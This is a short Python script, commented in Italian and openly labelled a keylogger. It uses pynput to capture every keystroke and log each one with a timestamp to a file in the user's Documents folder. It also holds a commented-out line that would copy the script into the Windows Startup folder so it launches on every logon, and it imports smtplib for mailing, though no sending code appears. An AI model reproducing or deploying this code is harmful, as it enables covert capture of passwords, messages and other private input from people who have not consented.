# keylogger
from pynput.keyboard import Listener
import os
import logging
from shutil import copyfile
# mail
import smtplib

# nome del login del sistema operativo
username = os.getlogin()
# directory in cui viene salvato il file che ci servirà
logging_directory = f"C:/Users/{username}/Documents"

# copia il file in una directori in cui verra avviato automaticamente all'avvio di windows
#copyfile('Keylogger.py', f"C:/Users/{username}/Appdata/Roaming/Microsoft/Start Manu/Startup/main.py")

# crea il file in cui scriverà
logging.basicConfig(filename=f"{logging_directory}/mylog.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")

#cattura ogni tasto che premiamo
def key_headler(key):
    logging.info(key)

# ascolta i tasti che premiamo all'imfinito e li scrive nel file
with Listener(on_press=key_headler) as listener:
    listener.join()